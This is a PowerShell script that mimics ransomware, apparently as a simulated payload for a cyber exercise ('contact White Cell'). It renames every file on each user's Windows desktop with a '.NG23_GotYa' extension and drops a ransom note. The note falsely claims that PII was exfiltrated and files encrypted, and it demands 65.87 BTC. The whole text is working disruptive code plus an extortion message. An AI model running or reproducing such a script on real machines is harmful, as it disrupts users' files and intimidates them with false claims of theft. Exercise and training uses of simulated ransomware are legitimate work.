$userdirectories = get-childitem "C:\users" | Select Name
$desktoppaths = [System.Collections.ArrayList]@()
foreach($userdirectory in $userdirectories) { 
    $desktoppaths.Add("C:\Users\" + $userdirectory.Name + "\desktop\")
}
foreach($path in $desktoppaths) { 
    $files = get-childitem $path
    foreach ($file in $files){ 
        $newname = $file.Name + ".NG23_GotYa"
        rename-item $path$file $path$newname
    }
    $ransomnote = $path + "RansomNoteReadMe.txt"
    Set-Content -path $ransomnote -value "You have been pwned! `r`n`r`nWe have exfiltrated PII data and encrypted your systems. `r`n`r`nIt will cost you 65.87BTC to get a decryptor. `r`n`r`nIf you do not pay, we will leak your data on the dark web for sale. `r`n`r`nPlease contact White Cell for further instructions!"
}